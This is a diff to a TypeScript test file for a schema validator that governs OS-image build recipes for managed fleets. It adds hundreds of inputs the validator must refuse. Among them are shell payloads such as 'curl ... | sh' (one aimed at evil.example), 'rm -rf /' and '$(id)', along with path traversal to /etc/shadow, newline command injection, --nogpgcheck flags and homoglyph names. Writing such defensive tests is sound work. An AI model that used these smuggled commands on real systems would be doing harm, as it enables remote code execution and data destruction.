@@ -424,6 +424,624 @@ const MUST_REFUSE: ReadonlyArray<Case> = [
     doc: mutate(S, (d) => { (d['organisation'] as Doc)['logo'] = '../../etc/shadow.png'; }),
     says: /no path, no parent directory, no symlink, no URL/i,
   },
+  // =================================================================================================
+  // SECOND TABLE. Everything above was written when the format was designed. Everything below was
+  // written by going back through the schema looking for a way IN rather than for a rule to restate,
+  // which is the only way a refusal table stays honest after the easy cases are covered.
+  //
+  // Each block ends where the last one would have stopped if somebody were trying rather than typing.
+  // =================================================================================================
+
+  // ---- a version pin, in every dnf spelling there is ----------------------------------------------
+  // The rule is a SHAPE -- an application name has no digits -- so the interesting question is not
+  // whether one spelling is blocked but whether any spelling of a version reaches a build at all.
+  ...[
+    'firefox-1.2',
+    'firefox-140.0-3.fc44.x86_64',
+    'firefox >= 140',
+    'firefox>=1.2',
+    'firefox=1.2',
+    'firefox<=140',
+    'firefox < 140',
+    'firefox-1:140',
+    '1:firefox',
+    'firefox-140.0-3.fc44.noarch',
+    'firefox.x86_64',
+    'firefox*',
+    'firefox?',
+    'firefox-*',
+    '*firefox*',
+    'kernel-core-6.11.3-200.fc40',
+    'libreoffice-core >= 7.6',
+  ].map((spelling) => ({
+    label: `a version pin or a glob spelled as an application: ${spelling}`,
+    doc: mutate(S, (d) => { (d['apps'] as string[]).push(spelling); }),
+    // The `why` is the appName description, which explains the shape rather than listing blocked
+    // spellings. That is the sentence a reader needs, and asserting on it is what makes this a test
+    // of the rule rather than a test of ajv's phrasing.
+    says: /No digits anywhere|version pin unspellable|raw package or Flatpak identifier/i,
+  })),
+
+  // ---- the FROM line, under every other name anyone has used for it --------------------------------
+  ...[
+    ['baseimage', 'ghcr.io/elsewhere/x'],
+    ['base_image', 'ghcr.io/elsewhere/x'],
+    ['image_ref', 'ghcr.io/elsewhere/x@sha256:beef'],
+    ['inherit_from', 'fedora:41'],
+    ['base_digest', 'sha256:beef'],
+    ['image_digest', 'sha256:beef'],
+    ['base_tag', 'stable'],
+    ['rebase_to', 'ghcr.io/elsewhere/x'],
+    ['upstream', 'ghcr.io/elsewhere/x'],
+    ['registry', 'docker.io'],
+    ['manifest', 'x'],
+    ['dockerfile', 'FROM scratch'],
+  ].map(([key, value]) => ({
+    label: `the foundation smuggled in as '${key}'`,
+    doc: mutate(S, (d) => { d[key!] = value; }),
+    says: /cannot name what it is built on|no field for the base image|same foundation/i,
+  })),
+
+  // ---- a kernel, a driver, a boot argument ---------------------------------------------------------
+  ...[
+    ['kernel_version', '6.11.3'],
+    ['kernel_pin', '6.11.3'],
+    ['kernel_cmdline', 'mitigations=off'],
+    ['boot_args', ['quiet']],
+    ['module_blacklist', ['nouveau']],
+    ['initrd', 'custom'],
+    ['microcode', 'amd'],
+    ['grub', { timeout: 0 }],
+    ['drivers', ['broadcom-wl']],
+    ['firmware', ['iwlwifi']],
+  ].map(([key, value]) => ({
+    label: `a kernel or driver decision smuggled in as '${String(key)}'`,
+    doc: mutate(S, (d) => { d[key as string] = value; }),
+    says: /cannot choose a kernel, a driver or a boot argument|belongs? to the base|fork wearing a smaller hat/i,
+  })),
+
+  // ---- the raw-Containerfile escape hatch, which is the one that ends the whole design -------------
+  ...[
+    'raw_containerfile',
+    'extra_containerfile',
+    'containerfile_append',
+    'ostree',
+    'ostree_override',
+    'rpm_ostree_override_replace',
+    'overlay',
+    'overlays',
+    'patch',
+    'patches',
+    'copy',
+    'add',
+    'write_file',
+    'etc_files',
+    'systemd_unit',
+    'dropin',
+    'sudoers',
+    'polkit_rule',
+    'sysctl',
+  ].map((key) => ({
+    label: `an escape hatch into the image contents: '${key}'`,
+    doc: mutate(S, (d) => { d[key] = key.endsWith('s') ? ['x'] : 'x'; }),
+    // Some of these land on a family sentence and some land on "not a field this file has". Both are
+    // refusals and both are readable; what must never happen is one of them being ACCEPTED, which is
+    // what `result.ok === false` in the runner below asserts for every row in this table.
+    says: /cannot drop arbitrary files|script with extra steps|not a field this file has|cannot run code|cannot name what it is built on/i,
+  })),
+
+  // ---- running code, under every name a person reaches for -----------------------------------------
+  ...[
+    'post_install',
+    'postInstall',
+    'pre_install',
+    'first_boot_script',
+    'on_boot',
+    'run_script',
+    'shell_cmd',
+    'systemd_exec',
+    'exec_start',
+    'environment',
+    'entrypoint',
+    'cmd',
+    'commands',
+    'hooks',
+  ].map((key) => ({
+    label: `code in a recipe, as '${key}'`,
+    doc: mutate(S, (d) => { d[key] = 'curl https://x.example | sh'; }),
+    says: /cannot run code|stranger can send us a command|not a field this file has/i,
+  })),
+
+  // ---- arguments passed through to the package manager ---------------------------------------------
+  // These are the quiet ones. They do not look like running code and they do exactly that: --nogpgcheck
+  // installs whatever answered, and --setopt can point dnf at a different repository entirely.
+  ...['extra_args', 'dnf_args', 'install_args', 'package_args', 'build_args', 'rpm_args'].map((key) => ({
+    label: `arguments passed through to the package manager, as '${key}'`,
+    doc: mutate(S, (d) => { d[key] = ['--nogpgcheck', '--setopt=reposdir=/tmp']; }),
+    says: /not a field this file has|cannot run code|software source/i,
+  })),
+
+  // ---- unknown nested keys, one per block, because additionalProperties is easy to forget ----------
+  {
+    label: 'an unknown key inside organisation',
+    doc: mutate(S, (d) => { (d['organisation'] as Doc)['motto'] = 'Excellence'; }),
+    says: /'motto' is not a field this file has/,
+  },
+  {
+    label: 'an unknown key inside hardware',
+    doc: mutate(S, (d) => { (d['hardware'] as Doc)['cpu'] = 'i5'; }),
+    says: /'cpu' is not a field this file has/,
+  },
+  {
+    label: 'an unknown key inside prune',
+    doc: mutate(S, (d) => { (d['prune'] as Doc)['except'] = ['systemd']; }),
+    says: /'except' is not a field this file has/,
+  },
+  {
+    label: 'an unknown key inside approved_by, which is where a forged signature would go',
+    doc: mutate(S, (d) => { (d['approved_by'] as Doc)['signature'] = 'trust me'; }),
+    says: /'signature' is not a field this file has|no way to ask for less testing/i,
+  },
+  {
+    label: 'an unknown key inside theme',
+    doc: mutate(S, (d) => { (d['theme'] as Doc)['custom_css'] = 'body{}'; }),
+    says: /not a field this file has/i,
+  },
+  {
+    label: 'an unknown key inside windows_apps',
+    doc: mutate(S, (d) => { (d['windows_apps'] as Doc)['wine_args'] = '-x'; }),
+    says: /not a field this file has/i,
+  },
+  {
+    label: 'an unknown key inside kiosk',
+    doc: mutate(K, (d) => { (d['kiosk'] as Doc)['proxy'] = 'http://x.example'; }),
+    says: /'proxy' is not a field this file has/,
+  },
+  {
+    label: 'an unknown key inside updates',
+    doc: mutate(S, (d) => { (d['updates'] as Doc)['enabled'] = false; }),
+    says: /not a field this file has/i,
+  },
+  {
+    label: 'an unknown key inside a windows_apps.tested row',
+    doc: mutate(S, (d) => { ((d['windows_apps'] as Doc)['tested'] as Doc[])[0]!['verified_by'] = 'us'; }),
+    says: /not a field this file has/i,
+  },
+  {
+    label: 'an unknown key inside helpdesk',
+    doc: mutate(S, (d) => { ((d['organisation'] as Doc)['helpdesk'] as Doc)['email'] = 'x@example.org'; }),
+    says: /not a field this file has/i,
+  },
+
+  // ---- the wrong TYPE in the right place -----------------------------------------------------------
+  // A YAML file written by hand gets these wrong constantly, and the interesting half is that a null
+  // must not be read as "absent and therefore defaulted". `prune: ~` is a legal YAML line and it must
+  // not mean "no pruning" on a product whose thesis is subtraction.
+  {
+    label: 'a null where the fleet name belongs',
+    doc: mutate(S, (d) => { d['name'] = null; }),
+    says: /must be string/i,
+  },
+  {
+    label: 'a null where the language belongs',
+    doc: mutate(S, (d) => { d['language'] = null; }),
+    says: /must be string/i,
+  },
+  {
+    label: 'a null in the middle of the applications list',
+    doc: mutate(S, (d) => { (d['apps'] as unknown[]).splice(2, 0, null); }),
+    says: /must be string/i,
+  },
+  {
+    label: 'a null prune block, which must never read as "nothing to remove"',
+    doc: mutate(S, (d) => { d['prune'] = null; }),
+    says: /must be object/i,
+  },
+  {
+    label: 'a null policy',
+    doc: mutate(S, (d) => { d['policy'] = null; }),
+    says: /not one of the published choices|must be string/i,
+  },
+  {
+    label: 'a null must_remove_at_least, which is the alarm switched off by a punctuation mark',
+    doc: mutate(S, (d) => { (d['prune'] as Doc)['must_remove_at_least'] = null; }),
+    says: /must be integer|must be number/i,
+  },
+  {
+    label: 'a list where a scalar belongs (name)',
+    doc: mutate(S, (d) => { d['name'] = ['example-school']; }),
+    says: /must be string/i,
+  },
+  {
+    label: 'a list where a scalar belongs (policy)',
+    doc: mutate(S, (d) => { d['policy'] = ['managed']; }),
+    says: /not one of the published choices|must be string/i,
+  },
+  {
+    label: 'a scalar where a list belongs (apps)',
+    doc: mutate(S, (d) => { d['apps'] = 'Firefox'; }),
+    says: /must be array/i,
+  },
+  {
+    label: 'an object where a scalar belongs (timezone)',
+    doc: mutate(S, (d) => { d['timezone'] = { name: 'Asia/Kolkata' }; }),
+    says: /must be string/i,
+  },
+  {
+    label: 'a string where a boolean belongs, which "yes" in YAML makes tempting',
+    doc: mutate(S, (d) => { (d['prune'] as Doc)['keep_only_the_apps_above'] = 'true'; }),
+    says: /must be boolean/i,
+  },
+  {
+    label: 'a numeric string where a number belongs',
+    doc: mutate(S, (d) => { d['size_budget_gb'] = '9'; }),
+    says: /must be number|must be integer/i,
+  },
+  {
+    label: 'a number where the fleet name belongs',
+    doc: mutate(S, (d) => { d['name'] = 12345; }),
+    says: /must be string/i,
+  },
+  {
+    label: 'a boolean where the approval name belongs',
+    doc: mutate(S, (d) => { (d['approved_by'] as Doc)['name'] = true; }),
+    says: /must be string/i,
+  },
+
+  // ---- sizes, counts and other numbers at their edges ----------------------------------------------
+  {
+    label: 'a fleet of minus five machines',
+    doc: mutate(S, (d) => { (d['hardware'] as Doc)['machines'] = -5; }),
+    says: /must be >= 1/i,
+  },
+  {
+    label: 'a fleet of zero machines',
+    doc: mutate(S, (d) => { (d['hardware'] as Doc)['machines'] = 0; }),
+    says: /must be >= 1/i,
+  },
+  {
+    label: 'a fleet of a billion machines',
+    doc: mutate(S, (d) => { (d['hardware'] as Doc)['machines'] = 1_000_000_000; }),
+    says: /must be <= 5000/i,
+  },
+  {
+    label: 'a fleet of one and a half machines',
+    doc: mutate(S, (d) => { (d['hardware'] as Doc)['machines'] = 1.5; }),
+    says: /must be integer/i,
+  },
+  {
+    label: 'a negative size budget',
+    doc: mutate(S, (d) => { d['size_budget_gb'] = -1; }),
+    says: /must be >= 2/i,
+  },
+  {
+    label: 'a size budget of five hundred gigabytes, which is not a budget',
+    doc: mutate(S, (d) => { d['size_budget_gb'] = 500; }),
+    says: /must be <= 40/i,
+  },
+  {
+    label: 'a negative removal floor',
+    doc: mutate(S, (d) => { (d['prune'] as Doc)['must_remove_at_least'] = -1; }),
+    says: /zero is not a legal value|must be >= 1|alarm anyone can turn down/i,
+  },
+  {
+    label: 'an empty applications list, which is a machine with nothing on it',
+    doc: mutate(S, (d) => { d['apps'] = []; }),
+    says: /fewer than 1 items/i,
+  },
+  {
+    label: 'the same application named twice',
+    doc: mutate(S, (d) => { (d['apps'] as string[]).push('Firefox'); }),
+    says: /duplicate items/i,
+  },
+  {
+    label: 'the same removable group named twice',
+    doc: mutate(S, (d) => { ((d['prune'] as Doc)['also_remove'] as string[]).push('games'); }),
+    says: /duplicate items/i,
+  },
+  {
+    label: 'a session that is never forgotten, written as zero minutes',
+    doc: mutate(K, (d) => { (d['kiosk'] as Doc)['forget_session_after_minutes'] = 0; }),
+    says: /must be >= 1/i,
+  },
+
+  // ---- a ten-megabyte string, which is what a pull request from a stranger can carry ----------------
+  {
+    label: 'a ten-megabyte paragraph in the "for" field',
+    doc: mutate(S, (d) => { d['for'] = 'a'.repeat(10 * 1024 * 1024); }),
+    says: /more than 1200 characters/i,
+  },
+  {
+    label: 'a ten-megabyte first-boot message',
+    doc: mutate(S, (d) => { d['first_boot_message'] = 'a'.repeat(10 * 1024 * 1024); }),
+    says: /more than 400 characters/i,
+  },
+  {
+    label: 'a ten-megabyte application name',
+    doc: mutate(S, (d) => { (d['apps'] as string[]).push('A'.repeat(10 * 1024 * 1024)); }),
+    says: /more than 48 characters/i,
+  },
+  {
+    label: 'a ten-megabyte organisation name',
+    doc: mutate(S, (d) => { (d['organisation'] as Doc)['display_name'] = 'A'.repeat(10 * 1024 * 1024); }),
+    says: /more than \d+ characters/i,
+  },
+
+  // ---- deeply nested objects -----------------------------------------------------------------------
+  {
+    label: 'two thousand levels of nesting hung off a known block',
+    doc: mutate(S, (d) => {
+      let node: Doc = {};
+      d['desktop'] = node;
+      for (let i = 0; i < 2000; i++) { const next: Doc = {}; node['x'] = next; node = next; }
+    }),
+    says: /not a field this file has/i,
+  },
+  {
+    label: 'two thousand levels of nesting hung off an unknown key',
+    doc: mutate(S, (d) => {
+      let node: Doc = {};
+      d['metadata'] = node;
+      for (let i = 0; i < 2000; i++) { const next: Doc = {}; node['x'] = next; node = next; }
+    }),
+    says: /not a field this file has/i,
+  },
+  {
+    label: 'a forbidden key buried two thousand levels down, where nobody would read it',
+    doc: mutate(S, (d) => {
+      let node: Doc = {};
+      d['metadata'] = node;
+      for (let i = 0; i < 2000; i++) { const next: Doc = {}; node['x'] = next; node = next; }
+      node['kernel_cmdline'] = 'mitigations=off';
+    }),
+    says: /not a field this file has|cannot choose a kernel/i,
+  },
+
+  // ---- unicode: a name that reads as one thing and is another --------------------------------------
+  {
+    label: 'a homoglyph: Cyrillic o inside an application name',
+    doc: mutate(S, (d) => { (d['apps'] as string[]).push(`Firef${String.fromCharCode(0x043e)}x`); }),
+    says: /No digits anywhere|letters, separated by single spaces/i,
+  },
+  {
+    label: 'a homoglyph: Greek omicron inside an application name',
+    doc: mutate(S, (d) => { (d['apps'] as string[]).push(`Firef${String.fromCharCode(0x03bf)}x`); }),
+    says: /No digits anywhere|letters, separated by single spaces/i,
+  },
+  {
+    label: 'fullwidth Latin, which renders as the right word and is not it',
+    doc: mutate(S, (d) => { (d['apps'] as string[]).push('Ｆｉｒｅｆｏｘ'); }),
+    says: /No digits anywhere|letters, separated by single spaces/i,
+  },
+  {
+    label: 'a zero-width space hiding inside an application name',
+    doc: mutate(S, (d) => { (d['apps'] as string[]).push('Fire​fox'); }),
+    says: /No digits anywhere|letters, separated by single spaces/i,
+  },
+  {
+    label: 'a zero-width joiner in the organisation name',
+    doc: mutate(S, (d) => { (d['organisation'] as Doc)['display_name'] = 'Example‍Vidyalaya'; }),
+    says: /control characters|invisible|direction/i,
+  },
+  {
+    label: 'a right-to-left isolate in the first-boot message',
+    doc: mutate(S, (d) => { d['first_boot_message'] = '⁦Welcome⁩'; }),
+    says: /control characters|invisible|direction/i,
+  },
+  {
+    label: 'an ANSI escape sequence in a name, aimed at whoever reads the build log',
+    doc: mutate(S, (d) => { (d['organisation'] as Doc)['display_name'] = 'Example[2J[HVidyalaya'; }),
+    says: /control characters|invisible|direction/i,
+  },
+  {
+    label: 'a NUL byte in a name',
+    doc: mutate(S, (d) => { (d['organisation'] as Doc)['display_name'] = 'Example Vidyalaya'; }),
+    says: /control characters|invisible|direction/i,
+  },
+  {
+    label: 'a newline in a name, which would end a comment line and start an instruction',
+    doc: mutate(S, (d) => { (d['organisation'] as Doc)['display_name'] = 'Example\nRUN echo pwned'; }),
+    says: /control characters|invisible|direction/i,
+  },
+
+  // ---- path traversal ------------------------------------------------------------------------------
+  {
+    label: 'path traversal in an application name',
+    doc: mutate(S, (d) => { (d['apps'] as string[]).push('../../etc/passwd'); }),
+    says: /No digits anywhere|letters, separated by single spaces/i,
+  },
+  {
+    label: 'path traversal in the fleet name, which is also a directory name',
+    doc: mutate(S, (d) => { d['name'] = '../../../etc'; }),
+    says: /is not a value this field can hold|short name for this fleet/i,
+  },
+  {
+    label: 'a slash in the fleet name, which is also part of an image reference',
+    doc: mutate(S, (d) => { d['name'] = 'someone/else'; }),
+    says: /is not a value this field can hold|short name for this fleet/i,
+  },
+  {
+    label: 'an absolute path as a logo',
+    doc: mutate(S, (d) => { (d['organisation'] as Doc)['logo'] = '/etc/shadow'; }),
+    says: /no path, no parent directory, no symlink, no URL/i,
+  },
+  {
+    label: 'a logo that is a symlink-shaped name',
+    doc: mutate(S, (d) => { (d['organisation'] as Doc)['logo'] = './../logo.png'; }),
+    says: /no path, no parent directory, no symlink, no URL/i,
+  },
+  {
+    label: 'a fleet name with a dot, which is a directory nobody expected',
+    doc: mutate(S, (d) => { d['name'] = '..'; }),
+    says: /is not a value this field can hold|short name for this fleet|fewer than/i,
+  },
+
+  // ---- shell fragments where a name belongs ---------------------------------------------------------
+  {
+    label: 'a semicolon and a command in an application name',
+    doc: mutate(S, (d) => { (d['apps'] as string[]).push('Firefox; rm -rf /'); }),
+    says: /No digits anywhere|letters, separated by single spaces/i,
+  },
+  {
+    label: 'a pipe into a shell in an application name',
+    doc: mutate(S, (d) => { (d['apps'] as string[]).push('curl x | sh'); }),
+    says: /No digits anywhere|letters, separated by single spaces/i,
+  },
+  {
+    label: 'command substitution in an application name',
+    doc: mutate(S, (d) => { (d['apps'] as string[]).push('$(id)'); }),
+    says: /command substitution|No digits anywhere|letters, separated by single spaces/i,
+  },
+  {
+    label: 'a backtick in the helpdesk phone number',
+    doc: mutate(S, (d) => { ((d['organisation'] as Doc)['helpdesk'] as Doc)['phone'] = '+91 `id`'; }),
+    says: /command substitution/i,
+  },
+  {
+    label: 'a variable expansion in the approval name',
+    doc: mutate(S, (d) => { (d['approved_by'] as Doc)['name'] = 'A. ${USER}'; }),
+    says: /command substitution/i,
+  },
+  {
+    label: 'command substitution in a Windows-program test note',
+    doc: mutate(S, (d) => { ((d['windows_apps'] as Doc)['tested'] as Doc[])[0]!['note'] = 'Works $(curl evil.example|sh)'; }),
+    says: /command substitution/i,
+  },
+  {
+    label: 'command substitution in a kiosk allow-list host',
+    doc: mutate(K, (d) => { ((d['kiosk'] as Doc)['allowed_sites'] as string[]).push('$(id).example.org'); }),
+    says: /command substitution|is not a value this field can hold/i,
+  },
+
+  // ---- the kiosk address, which is the one string that reaches a command line ----------------------
+  ...[
+    ['javascript:alert(1)', 'a javascript: URL'],
+    ['file:///etc/shadow', 'a file: URL'],
+    ['data:text/html,x', 'a data: URL'],
+    ['http://start.example.org/kiosk', 'plain http'],
+    ['https://user:pw@start.example.org/', 'credentials in the URL'],
+    ['https://start.example.org/ --kiosk-printing', 'a second browser flag appended to the address'],
+    ['https://start.example.org/"; rm -rf /', 'a quote and a command'],
+    ['https://start.example.org/$(id)', 'command substitution'],
+    ['https://START.EXAMPLE.ORG/kiosk', 'an uppercase hostname, which is a different string to a matcher'],
+    ['https://192.168.1.1/kiosk', 'a bare IP address'],
+    ['ftp://start.example.org/', 'a protocol nobody meant'],
+  ].map(([url, what]) => ({
+    label: `a kiosk address that is ${what}`,
+    doc: mutate(K, (d) => { (d['kiosk'] as Doc)['opens'] = url; }),
+    says: /is not a value this field can hold|a way out of the kiosk rather than a page inside it|command substitution|not in allowed_sites/i,
+  })),
+
+  // ---- the prune list reaching something protected --------------------------------------------------
+  // It cannot, and the point of these is that it cannot even be SPELT. `also_remove` is a closed enum,
+  // so every one of these is refused by the shape of the field rather than by a list of exceptions.
+  ...[
+    ['systemd', 'the init system, by name'],
+    ['bootc', 'the thing that applies an update, by name'],
+    ['greenboot', 'the thing that undoes a bad update, by name'],
+    ['NetworkManager', 'the thing that reaches the network, by name'],
+    ['rpm', 'the package manager, by name'],
+    ['boot*', 'the update path, by glob'],
+    ['*', 'everything, by glob'],
+    ['init system', 'the init system, by a group name that does not exist'],
+    ['update path', 'the update path, by a group name that does not exist'],
+    ['accessibility', 'accessibility, which is absent from the list on purpose'],
+    ['screen reader', 'the screen reader, by name'],
+    ['magnifier', 'the magnifier, by name'],
+    ['on-screen keyboard', 'the on-screen keyboard, by name'],
+    ['security', 'the security tooling, by a group name that does not exist'],
+  ].map(([value, what]) => ({
+    label: `pruning ${what}`,
+    doc: mutate(S, (d) => { ((d['prune'] as Doc)['also_remove'] as string[]).push(value!); }),
+    says: /no way to write the sentence that would brick a fleet|not one of the published choices|Accessibility is not removable|screen reader/i,
+  })),
+
+  // ---- the approval record, which is the thing a forged recipe would forge --------------------------
+  {
+    label: 'an approval dated in words rather than on a calendar',
+    doc: mutate(S, (d) => { (d['approved_by'] as Doc)['date'] = 'yesterday'; }),
+    says: /is not a value this field can hold|calendar/i,
+  },
+  {
+    label: 'an approval dated on the ninety-ninth of the ninety-ninth',
+    doc: mutate(S, (d) => { (d['approved_by'] as Doc)['date'] = '9999-99-99'; }),
+    says: /is not a value this field can hold|calendar/i,
+  },
+  {
+    label: 'an approval with no name on it',
+    doc: mutate(S, (d) => { delete (d['approved_by'] as Doc)['name']; }),
+    says: /and it is required/i,
+  },
+  {
+    label: 'no approval block at all',
+    doc: mutate(S, (d) => { delete d['approved_by']; }),
+    says: /no 'approved_by', and it is required/i,
+  },
+  {
+    label: 'a Windows-program result invented on the spot',
+    doc: mutate(S, (d) => { ((d['windows_apps'] as Doc)['tested'] as Doc[])[0]!['result'] = 'probably fine'; }),
+    says: /not one of the published choices/i,
+  },
+  {
+    label: 'windows_apps enabled without the acknowledgement that nothing else is promised',
+    doc: mutate(S, (d) => { delete (d['windows_apps'] as Doc)['we_promise_nothing_else']; }),
+    says: /and it is required|promise/i,
+  },
+
+  // ---- the document itself --------------------------------------------------------------------------
+  {
+    label: 'a recipe that is a list rather than a block of settings',
+    doc: [] as unknown as Doc,
+    says: /not a list or a bare value/i,
+  },
+  {
+    label: 'a recipe that is a bare string',
+    doc: 'example-school' as unknown as Doc,
+    says: /not a list or a bare value/i,
+  },
+  {
+    label: 'a recipe that is a number',
+    doc: 42 as unknown as Doc,
+    says: /not a list or a bare value/i,
+  },
+  {
+    label: 'an empty recipe',
+    doc: {} as Doc,
+    says: /and it is required/i,
+  },
+  {
+    label: 'a recipe with no schema version, which is the one field that makes the rest readable later',
+    doc: mutate(S, (d) => { delete d['schema']; }),
+    says: /no 'schema', and it is required/i,
+  },
+  {
+    label: 'a schema version from the future',
+    doc: mutate(S, (d) => { d['schema'] = 99; }),
+    says: /refuses to build rather than guessing what a field used to mean/i,
+  },
+  {
+    label: 'a schema version of zero',
+    doc: mutate(S, (d) => { d['schema'] = 0; }),
+    says: /refuses to build rather than guessing what a field used to mean/i,
+  },
+
+  // ---- a kiosk that opens something nobody chose -----------------------------------------------------
+  {
+    label: 'a kiosk naming two applications, with nothing saying which one it opens',
+    doc: mutate(K, (d) => { d['apps'] = ['Firefox', 'Google Chrome']; }),
+    says: /nothing here says which one it opens|still boots, still looks right, and is wrong/i,
+  },
+  {
+    label: 'a kiosk naming three applications',
+    doc: mutate(K, (d) => { d['apps'] = ['Firefox', 'Google Chrome', 'VLC Media Player']; }),
+    says: /nothing here says which one it opens/i,
+  },
+  {
+    label: 'a kiosk whose only application cannot be opened as a window',
+    doc: mutate(K, (d) => { d['apps'] = ['Calculator']; }),
+    says: /names no application the machine can open|brick/i,
+  },
+
 ];
 
 test('every refusal fires, and says why refusing is the feature', async (t) => {
@@ -447,7 +1065,7 @@ test('the table is large enough to be worth having', () => {
   // Not a real assertion about correctness -- a guard against the table being quietly emptied. If
   // this ever fails because somebody consolidated cases, raise the floor deliberately or lower it
   // in a commit that says why.
-  assert.ok(MUST_REFUSE.length >= 50, `only ${MUST_REFUSE.length} refusal cases`);
+  assert.ok(MUST_REFUSE.length >= 200, `only ${MUST_REFUSE.length} refusal cases`);
 });
 
 test('a refusal never leaks raw validator noise where a sentence was available', () => {
